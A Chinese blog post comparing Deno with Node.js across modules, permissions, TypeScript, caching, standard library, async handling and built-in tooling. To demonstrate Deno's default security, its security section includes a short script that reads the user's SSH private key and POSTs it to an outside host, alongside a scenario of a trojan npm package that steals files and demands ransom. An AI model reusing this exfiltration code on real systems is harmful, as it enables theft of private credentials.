---
title: 了解xiadeno，与node的区别是什么？
tags: 'Deno'
categories: 'Deno'
date: 2020-05-17 21:37:07
---

# Deno VS Node

|  不同点  | Node |     	Deno |
| --------   | -----:  | :----:  |
|API 引用方式|	模块导入|	全局对象|
|模块系统	|CommonJS & 新版 node 实验性 ES Module|	ES Module 浏览器实现|
|安全|	无安全限制|	默认安全|
|Typescript|	第三方，如通过 ts-node 支持|	原生支持|
|包管理|	npm + node_modules|	原生支持|
|异步操作|	回调|	Promise|
|包分发|	中心化 npmjs.com|	去中心化 import url
|入口|	package.json 配置|	import url 直接引入|
|打包、测试、格式化|	第三方如 eslint、gulp、webpack、babel 等|	原生支持|

## 1.内置 API 引用方式不同

**node 模块导入**

node 内置 API 通过模块导入的方式引用，例如：

```js
const fs = require("fs");
fs.readFileSync("./data.txt");
```

**deno 全局对象**

而 deno 则是一个全局对象 Deno 的属性和方法：

```js
Deno.readFileSync("./data.txt");
具体 deno 有哪些方法，我们可以通过 repl 看一下：
```
```js
deno # 或 deno repl
```
进入 `repl` 后，输入 Deno 回车，我们可以看到：
```json
{
 Buffer: [Function: Buffer],
 readAll: [AsyncFunction: readAll],
 readAllSync: [Function: readAllSync],
 writeAll: [AsyncFunction: writeAll],
 writeAllSync: [Function: writeAllSync],
 # .....
}
```

这种处理的方式好处是**简单、方便**，坏处是**没有分类**，想查找忘记的 API 比较困难。总体来说见仁见智。

## 2.模块系统

我们再来看一下模块系统，这也是 deno 和 node **差别最大的地方**，同样也是 deno 和 node 不兼容的地方。

**node CommonJS 规范**
我们都知道 node 采用的是 CommonJS 规范，而 deno 则是采用的 ES Module 的浏览器实现，那么我们首先来认识一下：

**ES Module 的浏览器实现**
具体关于 ES Module 想必大家都早已熟知，但其浏览器实现可能大家还不是很熟悉，所以我们先看一下其浏览器实现：

```html
<body>
  <!-- 注意这里一定要加上 type="module" -->
  <script type="module">
    // 从 URL 导入
    import Vue from "https://unpkg.com/vue@2.6.11/dist/vue.esm.browser.js";
    // 从相对路径导入
    import * as utils from "./utils.js";
    // 从绝对路径导入
    import "/index.js";

    // 不支持
    import foo from "foo.js";
    import bar from "bar/index.js";
    import zoo from "./index"; // 没有 .js 后缀
  </script>
</body>
```

**deno 的模块规范**
deno 完全遵循 es module 浏览器实现，所以 deno 也是如此：

```js
// 支持
import * as fs from "https://deno.land/std/fs/mod.ts";
import { deepCopy } from "./deepCopy.js";
import foo from "/foo.ts";

// 不支持
import foo from "foo.ts";
import bar from "./bar"; // 必须指定扩展名\
```

我们发现其和我们平常在 webpack 或者 ts 使用 es module 最大的不同：

* 可以通过 import url 直接引用线上资源；

* 资源不可省略扩展名和文件名。

关于第 1 点，争议非常大，有人很看好，觉得极大的扩展了 deno 库的范围；有人则不太看好，觉得国内网速的原因，并不实用。

## 3.安全

如果模块规范是 node 和 deno 最大的不同，那么对安全的处理，则是另外一个让人摸不着头脑的地方。

**模拟盗号**

在介绍之前我们先思考一下这个场景会不会出现：

我做了一个基于命令行的一键上网工具 `breakwall`，每月 1 个 G 免费流量，然后将压缩后的 JS 代码发布到 npm 上，然后后在各种渠道宣传一波。

羊毛党兴高彩烈的 `cnpm install -g breakwall`，然后每次使用的时候，我偷偷的将诸位的 ssh 密钥和各种能偷的文档及图片偷偷上传到我的服务器，在设定期限到期后，删除电脑上资料，留下一句拿钱换资料，仅支持比特币。

**默认安全的 deno**

如果你觉得以上情况有可能出现，则会觉得下面的功能很实用。我们先用 deno 执行以下代码：

```js
// index.js
let rsa = Deno.readFileSync(Deno.dir("home") + "/.ssh/id_rsa");

rsa = new TextDecoder().decode(rsa);

fetch("http://jsonplaceholder.typicode.com/posts/1", {
  method: "POST",
  body: JSON.stringify(rsa)
})
  .then((res) => res.json())
  .then((res) => console.log("密钥发送成功，嘿嘿嘿😜"));

console.log("start breakwall...");
```

> PS: --unstable 是由于 Deno.dir API 不稳定

```js
 deno run --unstable index.js
```

我们将会得到如下报错信息：

```js
> deno run --unstable  index.js
error: Uncaught PermissionDenied: access to environment variables, run again with the --allow-env flag
    ...
```

意思就是权限异常，需要访问环境变量，需要加上 `--allow-env`，我们加上这个参数再试一下。

```js
 deno run --unstable --allow-env index.js
error: Uncaught PermissionDenied: read access to "/Users/zhangchaojie/.ssh/id_rsa", run again with the --allow-read flag
    ...
```
如此反复，还需加上 `--allow-read`、`--allow-net` ，最终的结果是：
```js
> deno run --unstable --allow-env --allow-read --allow-net  index.js
start breakwall...
密钥发送成功，嘿嘿嘿😜
```

经过一番折腾，总算是发送成功了，要想盗取密钥实属不易。

**白名单**

那有人就说了，如果我的应用确实需要访问网络和文件，但是有不想让它访问 .ssh 文件有没有办法？

当然有了，我们可以给 `--allow-read` 和 `--allow-net` 指定白名单，名单之外都不可访问，例如：

```js
> deno run --unstable --allow-env --allow-read --allow-net=https://www.baidu.com  index.js
start breakwall...
error: Uncaught PermissionDenied: network access to "http://jsonplaceholder.typicode.com/posts/1", run again with the --allow-net flag
    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)
    at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)
    at async fetch ($deno$/web/fetch.ts:591:27)
```

**简化参数**

如果确认是没问题，或者是自己开发软件时，图个方便，可以直接使用 -A 或 --allow-all 参数允许所有权限：

```js
> deno -A --unstable index.js
start breakwall...
密钥发送成功，嘿嘿嘿😜
```
安全这方面见仁见智，有人觉得是多余，有人觉得很好用，极大的增强了安全性。如果你属于觉得这个功能多余的，可以 deno run -A xxx 即可。

## 4.兼容浏览器 API

关于为什么，我举个栗子大家就明白了：在设计 node 之处，关于输出函数本来叫 `print` 之类的，后来有人提议为什么不叫 `console.log`，ry 觉得挺不错，于是就接纳了意见。

但是，这个设计并不是刻意为之，而 deno 的设计则可以为之，通过与浏览器 API 保持一致，来减少大家的认知。

**怎么兼容浏览器 API**

> 概念上兼容
* 模块系统，从上面介绍看出 deno 是完全遵循浏览器实现的；

* 默认安全，当然也不是自己创造的概念，w3c 早已做出浏览器权限的规定，我们在做小程序的时候尤为明显，需要获取各种权限；

* 对于异步操作返回 Promise；

* 使用 `ArrayBuffer` 处理二进制；

> 存在 window 全局变量

`console.log(window === this, window === self, window === globalThis);`

> 实现了 WindowOrWorkerGlobalScope 的全部方法

具体方法列表，我们可以参考：`lib.deno.shared_globals.d.ts` 和 `lib.deno.window.d.ts`

```js
// 请求方法
fetch("https://baidu.com");

// base64 转化
let encodedData = btoa("Hello, world"); // 编码
let decodedData = atob(encodedData); // 解码

// 微任务
queueMicrotask(() => {
  console.log(123);
});
```

> 大趋势

总体而言，如果服务端和浏览器端存在相同概念，deno 就不会创造新的概念。这一点其实 node 也在做，新的 node 14.0 CHANGELOG 就也提及要实现 Universal JavaScript 和 Spec compliance and Web Compatibility的思想，所以这点大家应该都会接受吧，毕竟大势所趋趋势。

## 5.支持 Typescript

不管你喜欢与否，2020 年了，必须学习 TS 了（起码在面试的时候是亮点）。学完之后你才会明白王境泽定律真的无处不在。

```js
// index.ts
let str: string = "王境泽定律";
str = 132;
> deno run index.ts
error TS2322: Type '123' is not assignable to type 'string'.

► file:///Users/zhangchaojie/Desktop/index.ts:2:1

2 str = 123
  ~~~
```

## 6.去 node_modules

deno 没有 `node_modules`，那么它是怎么进行包管理的呢？我们先看下面的例子

```js
// index.js
import { white, bgRed } from "https://deno.land/std/fmt/colors.ts";

console.log(bgRed(white("hello world!")));
> deno run index.js
Download https://deno.land/std/fmt/colors.ts
Compile https://deno.land/std/fmt/colors.ts
hello world!
```
我们看到其有 Download 和 Compile 两个步骤，我们会产生几个疑问：

> 1、每次执行都要下载吗？

解：我们只需要再执行一次就能明白，不需要每次下载。

```js
> deno run index.js
hello world!
```
> 2、Download 和 Compile 的文件在哪里呢？

解：我们会发现，当前执行的目录，并没有 Download 和 Compile 文件，那文件放在哪里呢，我们首先来看一下 deno --help 命令：
```js
> deno --help
SUBCOMMANDS:
# ...
info           Show info about cache or info related to source file

# ...
ENVIRONMENT VARIABLES:
    DENO_DIR   Set deno's base directory (defaults to $HOME/.deno)
```
deno info 命令展示了依赖关系，类似 package.json。

```js
> deno info index.js
local: /Users/zhangchaojie/Desktop/index.js
type: JavaScript
deps:
file:///Users/zhangchaojie/Desktop/index.js
  └── https://deno.land/std/fmt/colors.ts
```

DENO_DIR 则为实际的安装和编译目录，相当于 node_modules，默认为 $HOME/.deno（命令提示是这样的，但实际需要指定一下环境变量 `export DENO_DIR=$HOME/.deno）`，我们看一下：

```js
> tree $HOME/.deno
/Users/zhangchaojie/.deno
├── deps
│   └── https
│       └── deno.land
│           ├── 3574883d8acbaf00e28990ec8e83d71084c4c668c1dc7794be25208c60cfc935
│           └── 3574883d8acbaf00e28990ec8e83d71084c4c668c1dc7794be25208c60cfc935.metadata.json
└── gen
    └── https
        └── deno.land
            └── std
                └── fmt
                    ├── colors.ts.js
                    ├── colors.ts.js.map
                    └── colors.ts.meta

8 directories, 5 files
```
> 3、没网络了怎么办？

我们有些场景是将本地写好的代码部署到没有网络的服务器，那么当执行 deno run xxx 时，就是提示 error sending request。

解：将上面的缓存目录内容，直接拷贝到服务器并指定环境变量到其目录即可。

> 4、依赖代码更新了怎么办？

解：当依赖模块更新时，我们可以通过 --reload 进行更新缓存，例如：

`> deno run --reload index.js`
我们还可以通过白名单的方式，只更新部分依赖。例如：

`> deno run --reload=https://deno.land index.js`
> 5、仅缓存依赖，不执行代码有办法吗？

解：有的，我们可以通过 deno cache index.js 进行依赖缓存。

> 6、多版本怎么处理？

解：暂时没有好的解决方案，只能通过 git tag 的方式区分版本。

## 7.标准模块 与 node API 兼容
我们通过第 1 点可以看到，其实 deno 的 API 相对于 node 其实是少一些的，通过其文件大小也能看出来：

```js
> ll /usr/local/bin/node /Users/zhangchaojie/.local/bin/deno
-rwxr-xr-x  1   42M   /Users/zhangchaojie/.local/bin/deno
-rwxr-xr-x  1   70M   /usr/local/bin/node
```
那这些少的 API 只能自己写或者求助于社区吗？

deno 对于自身相对于 node 少的和社区中常用的功能，提供了标准模块，其特点是不依赖非标准模块的内容，达到社区内的模块引用最后都收敛于标准模块的效果。例如：
```js
// 类似 node 中 chalk 包
import { bgRed, white } from "https://deno.land/std/fmt/colors.ts";

// 类似 node 中的 uuid 包
import { v4 } from "https://deno.land/std/uuid/mod.ts";
```
同时为了对 node 用户友好，提供了 node API 的兼容
```js
import * as path from "https://deno.land/std/node/path.ts";
import * as fs from "https://deno.land/std/node/fs.ts";

console.log(path.resolve('./', './test'))
```
所以，大家在为 deno 社区做贡献的时候，首先要看一下标准模块有没有提供类似的功能，如果已经提供了可以进行引用。

## 8.异步操作

> 根据 ry 自己是说法，在设计 node 是有人提议 Promise 处理回调，但是他没听，用他自己的话说就是愚蠢的拒绝了。

**node 用回调的方式处理异步操作、deno 则选择用 Promise**

```js
// node 方式
const fs = require("fs");
fs.readFile("./data.txt", (err, data) => {
  if (err) throw err;
  console.log(data);
});
```

另外 deno 支持 top-level-await，所以以上读取文件的代码可以为：

```js
// deno 方式
const data = await Deno.readFile("./data.txt");
console.log(data);
```

node 关于这方面也在一直改进，例如社区上很多 `promisify` 解决方案，通过包裹一层函数，实现目的。例如：

```js
// node API promisify
const { promisify } = require("es6-promisify");
const fs = require("fs");

// 没有 top-level-await，只能包一层
async function main() {
  const readFile = promisify(fs.readFile);
  const data = await readFile("./data.txt");
  console.log(data);
}

main();
```

## 9.单文件分发

我们知道 npm 包必须有 `package.json` 文件，里面不仅需要指明 main 或 module 或 browser 等字段来标明入口文件，还需要指明 `name 、license 、description` 等字段来说明这个包。

ry 觉得这些字段扰乱了开发者的视听，所以在 deno 中，其模块不需要任何配置文件，直接是 import url 的形式。

## 10.去中心化仓库
对于 `www.npmjs.com` 我们肯定都不陌生，它是推动 node 蓬勃发展的重要支点。但作者认为它是中心化仓库，违背了互联网去中心化原则。

所以 deno 并没有一个像 npmjs.com 的仓库，通过 import url 的方式将互联网任何一处的代码都可以引用。

PS：deno 其实是有个基于 `GitHub` 的第三方模块集合。

## 11.去开发依赖
我们在写一个 node 库或者工具时，开发依赖是少不了的，例如 babel 做转化和打包、jest 做测试、prettier 做代码格式化、eslint 做代码格式校检、gulp 或者 webpack 做构建等等，让我们在开发前就搞得筋疲力尽。

> deno 通过内置了一些工具，解决上述问题。

* `deno bundle`：打包命令，用来替换 babel、gulp 一类工具: 例如：deno bundle ./mod.ts；

* `deno fmt`：格式化命令，用来替换 prettier 一类工具，例如：deno fmt ./mod.ts；

* `deno test`：运行测试代码，用来替换 jest 一类工具，例如 deno test ./test.ts；

* `deno lint`：代码校检（暂未实现），用来替换 eslint 一类工具，例如：deno lint ./mod.ts。

## 后记

就像小时候一直幻想的炸弹始终没能炸了学校，技（轮）术（子）的进（制）步（造）一直也未停止过。不论我们学的动或者学不动，技术就在那里，不以人的意志为转移。

至于 deno 能不能火，我个人觉得起码一两年内不会有太大反响，之后和 node 的关系有可能像 Vue 和 react，有人喜欢用 deno，觉得比 node 好一万倍，有人则喜欢 node ，觉得 node 还能再战 500 年。至于最终学不学还看自己。

[20 分钟入门 deno](https://juejin.im/post/5ebcabb2e51d454da74185a9)

